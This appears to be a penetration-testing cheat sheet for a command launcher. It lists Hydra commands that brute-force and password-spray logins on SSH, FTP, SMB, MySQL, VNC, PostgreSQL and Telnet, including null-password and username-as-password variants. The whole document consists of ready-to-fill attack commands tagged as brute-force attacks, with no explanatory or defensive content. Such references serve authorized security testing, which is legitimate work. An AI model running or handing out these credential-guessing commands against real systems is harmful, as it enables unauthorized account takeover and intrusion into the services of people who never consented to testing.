# Hydra

% bruteforce, access

## Hydra - ssh - userlist and password list - 22
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -L <USER_FILE> -P <PASS_FILE> <IP> ssh 
```

## Hydra - ssh - user and password  - 22
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
hydra -l <user|root> -p <password|root> <IP> ssh 
```

## Hydra - ssh - user=password - 22
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -e s <IP> ssh 
```

## Hydra - ssh - null password - 22
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -l <user|root> -e n <IP> ssh 
```

## Hydra - ssh - password=reverseuser - 22
#plateform/linux #target/remote #protocol/ssh #port/22 #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -e r <IP> ssh 
```

## Hydra - ssh - file 'login:pass' format - specify port
#plateform/linux #target/remote #protocol/ssh #port/custom #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -t 4 -s <PORT> -C <file_login_pass> <IP> ssh 
```

## Hydra - ftp - 21 
#protocol/ftp #port/21 #plateform/linux #target/remote  #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> ftp 
```

## Hydra - smb - 445
#protocol/smb #port/445 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> smb
```

## Hydra - mysql - 3306
#protocol/mysql #port/3306 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> mysql 
```

## Hydra - vnc - 5900
#protocol/vnc #port/5900 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> vnc 
```

## Hydra - postgres - 5432
#protocol/postgres #port/5432 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> postgres
```

## Hydra - telnet - 23
#protocol/telnet #port/23 #plateform/linux #target/remote #cat/ATTACK/BRUTEFORCE-SPRAY 

```
hydra -L <USER_FILE> -P <PASS_FILE> <IP> telnet 
```

= userlist: users.txt
= passlist: pass.txt
